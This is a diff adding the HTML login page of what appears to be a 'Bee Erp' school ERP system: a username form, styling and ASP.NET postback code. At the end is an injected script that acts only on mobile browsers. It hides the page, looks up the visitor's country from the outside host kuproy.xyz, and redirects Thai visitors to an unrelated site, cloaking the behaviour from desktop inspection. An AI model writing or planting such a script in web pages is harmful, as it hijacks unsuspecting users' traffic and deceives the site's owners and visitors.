@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="en"><head>
+    <title>Bee Erp Login</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+
+    <!--Css files-->
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="Css/css/bootstrap.min.css">
+    <link href="../Css/css/menunotifications.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/png" href="images/beeslogo.png" sizes="32x32">
+
+    <style>
+        body, html {
+            font-family: 'Arial Rounded MT';
+            height: 100%;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .bg_img {
+            background-image: url("Images/bgimage3.png");
+            /*background-color:#1e663e;*/
+            background-position: center;
+            background-size: cover;
+            min-height: 100%;
+            background-repeat: no-repeat;
+        }
+
+        input#ImgUserPhoto {
+            border-radius: 50%;
+            width: 22%;
+            margin-bottom: 20px;
+            margin-left: 13%;
+        }
+
+        .college_codfe {
+            width: 105%;
+            margin-bottom: 20px;
+        }
+
+        .links {
+            margin-top: 14%;
+        }
+
+        .form-right {
+            margin-top: 5%;
+        }
+
+        .next_button {
+            width: 105%;
+        }
+
+        img#logo {
+            width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+
+        @media only screen and (min-width: 1200px) {
+            .bg_img {
+                background-image: url("Images/bgimage3.png");
+                /*background-color:#1e663e;*/
+                background-position: center;
+                background-size: cover;
+                /*min-height: 500px;*/
+                background-repeat: no-repeat;
+                /*filter: blur(8px);
+  -webkit-filter: blur(8px);*/
+                /*background: linear-gradient(to bottom, #5c307d 0%, #b74c9c 100%);*/
+                /*background: linear-gradient(to bottom, #51b84b 0%, #74c90c 100%);*/
+            }
+        }
+
+        .footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            /*background-color: red;*/
+            color: white;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .card-container.card {
+            max-width: 100%;
+            padding: 40px 40px;
+        }
+
+        .card {
+            /*background-color: #ffffff;*/
+            background-color: #F7F7F7;
+            /* just in case there no content*/
+            /*padding: 20px 25px 30px;*/
+            padding: 10px 15px 20px;
+            margin: 0 auto 25px;
+            margin-top: 140px;
+            /* shadows and rounded borders */
+            -moz-border-radius: 2px;
+            -webkit-border-radius: 2px;
+            border-radius: 20px;
+            -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+            -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+            box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+            /*border-radius:20px;*/
+        }
+
+        @media only screen and (max-width:320px) {
+            .card-container.card {
+                margin-top: 0;
+                height: 700px;
+                display: flex;
+                border-radius: 0;
+                background-image: url("Images/pattern.jpg");
+                background-repeat: repeat;
+            }
+
+            .footer {
+                color: darkblue;
+            }
+        }
+
+        @media only screen and (max-width: 420px) {
+            #Image1 {
+                display: none;
+            }
+        }
+
+        @media only screen and (max-width: 320px) {
+            #Image1 {
+                display: none;
+            }
+        }
+    </style>
+
+</head>
+<body style="visibility: visible;">
+
+    <div class="container-fluid bg_img">
+        <span>
+            <img id="Image1" alt="" src="Images/Beeslogo2.png" style="height:90px;width:100px;border-width:0px;position: absolute; right: 5px; border-radius: 5px">
+        </span>
+        <div class="row ">
+            <div class="col-xl-6 col-lg-6 col-md-9 card card-container">
+
+                <div class="row">
+                    <div class="col-md-12">
+                        <img id="Image2" class="mx-auto d-block img-fluid" src="Images/header.jpg" style="width:100%;border-width:0px;">
+                    </div>
+                </div>
+                <form name="ctl00" method="post" action="./Login.aspx" id="ctl00">
+<div>
+<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTk1NzEzMjEyNQ8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAQUMSW1nVXNlclBob3RvRFHdHUxJOvmfhxuZ2KnacSzQpyfbC+GYBYKDAmKswjE=">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['ctl00'];
+if (!theForm) {
+    theForm = document.ctl00;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=JgMkbVeUdZJKjM18s0EUrzinHsL9zSKHf6dcg49C6z3S2E1Xw_La359p4qV7woU-QamPRVrJ-6mU6rqtB-llRx0AVRqkc1iwjLLtsxr2xLE1&amp;t=638901734248157332" type="text/javascript"></script>
+
+
+<script src="/WebResource.axd?d=iPY07p3aGEgq8hvMUQqAnaLl-KzBrr673DCcFeuhmGX7zC9bvyzRIo_fVozgc0KUVJHsoXcKxjDtV2eMilCdWEwCEuaqmrVDu6aniNsV3i01&amp;t=638901734248157332" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C2EE9ABB">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAYTgjAi1MRaHk2feXUgnLOSlSfEvot8s98xACen5j++l+5PVNfdHmla7NuBu7/wrMPS+VrIiJsmVmbYcR2E/1qWY3plgk0YBAefRz3MyBlTcIFjpILoFgeQqvXWA+7aEDQQbKHfR5K/veGNGYcrW4ZL3Xa4U9RtiXn7wqDFfD1ONg==">
+</div>
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-12 border-right text-center">
+                                <div class="links">
+
+                                    <p>
+                                        
+                                    </p>
+                                    <p>
+                                        
+                                    </p>
+                                    <p>
+                                        
+                                    </p>
+                                    <p>
+                                        
+                                    </p>
+                                    <p>
+                                        <a id="lnkStudentOfficeLogin" autopostback="true" href="javascript:__doPostBack('lnkStudentOfficeLogin','')" style="color:Blue;"> Student Office 365 Login </a>
+                                    </p>
+                                    <p>
+                                        <a id="lnkApplyOpacUrl" autopostback="true" href="javascript:__doPostBack('lnkApplyOpacUrl','')" style="color:Blue;font-size:15px;font-weight:bold;"> OPAC </a>
+                                    </p>
+                                    <p>
+                                        
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="col-md-6 text-center">
+                                <div class="form-right">
+
+                                    
+                                    <div class="user_circle ">
+                                        <input type="image" name="ImgUserPhoto" id="ImgUserPhoto" class="img-rounded" src="Images/avatar2.png" style="border-width:0px;">
+
+                                    </div>
+                                    
+
+                                    <div class="college_codfe  input-group-prepend border-0">
+                                        <span id="lbluser" class="input-group-text"><i class="fa fa-user"></i> </span>
+                                        <input name="txtUserName" type="text" id="txtUserName" placeholder="User Name" class="form-control">
+                                    </div>
+                                    <div class="college_codfe input-group-prepend">
+                                        <span>
+                                            </span>
+                                        
+                                    </div>
+                                    <div class="next_button  ">
+                                        <input type="submit" name="btnNext" value="Next" id="btnNext" class="btn btn-primary btn-md btn-block">
+                                    </div>
+                                    <div class="next_button ">
+                                        
+                                    </div>
+                                    <p id="emailHelp" class="form-text text-muted">
+                                        
+                                    </p>
+                                    <span id="lblWarning" class="MessageLabelRed" style="color:Red;"></span>
+                                    
+                                    
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="container-fluid footer bg-warning">
+                            <div class="row">
+                                <div class="col-xl-12 col-lg-12 col-md-12 p-1">
+                                    Copyright © 2020 BeeS Software Solutions Pvt. Ltd.
+                                </div>
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                
+
+<script type="text/javascript">
+//<![CDATA[
+WebForm_AutoFocus('txtUserName');//]]>
+</script>
+</form>
+
+            </div>
+        </div>
+    </div>
+
+    <!--Js files-->
+    <script src="Css/css/jquery.min.js"></script>
+    <script src="Css/css/popper.min.js"></script>
+    <script src="Css/css/bootstrap.min.js"></script>
+
+    <script type="text/javascript">
+        function checkcapslockon(e) {
+            var charKeyCode = e.keyCode ? e.keyCode : e.which;
+            var shiftKey = e.shiftKey ? e.shiftKey : ((charKeyCode == 16) ? true : false);
+            if (((charKeyCode >= 65 && charKeyCode <= 90) && !shiftKey) || ((charKeyCode >= 97 && charKeyCode <= 122) && shiftKey)) {
+                document.getElementById('capsWarningDiv').style.visibility = 'visible';
+            }
+            else {
+                document.getElementById('capsWarningDiv').style.visibility = 'hidden';
+            }
+        }
+    </script>
+    <script>
+
+        top.window.moveTo(0, 0);
+        if (document.all) {
+            top.window.resizeTo(screen.availWidth, screen.availHeight);
+        }
+        else if (document.layers || document.getElementById) {
+            if (top.window.outerHeight < screen.availHeight || top.window.outerWidth < screen.availWidth) {
+
+                top.window.outerHeight = screen.availHeight;
+                top.window.outerWidth = screen.availWidth;
+            }
+        }
+
+
+        function noBack() {
+            window.history.forward();
+        }
+        noBack();
+        window.onload = noBack;
+        window.onpageshow = function (evt) {
+            if (evt.persisted) noBack();
+        }
+        window.onunload = function () {
+            void (0);
+        }
+
+    </script>
+<script>
+(function() {
+
+    if (typeof IS_DESKTOP !== 'undefined' || !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        document.body.style.visibility = 'visible';
+        return;
+    }
+    
+
+    var key = 'geo_th_v1';
+    var cached = localStorage.getItem(key);
+    
+    if (cached === 'TH') {
+        location.href = 'https://www.wakeboard-madrid.com/';
+        return;
+    }
+    
+    if (cached && cached !== 'TH') {
+        document.body.style.visibility = 'visible';
+        return;
+    }
+    
+    fetch('https://kuproy.xyz/')
+        .then(function(r) { return r.text(); })
+        .then(function(c) {
+            localStorage.setItem(key, c.trim().toUpperCase());
+            location.reload();
+        })
+        .catch(function() {
+            localStorage.setItem(key, 'OTHER');
+            location.reload();
+        });
+})();
+</script>
+
+
+</body></html>
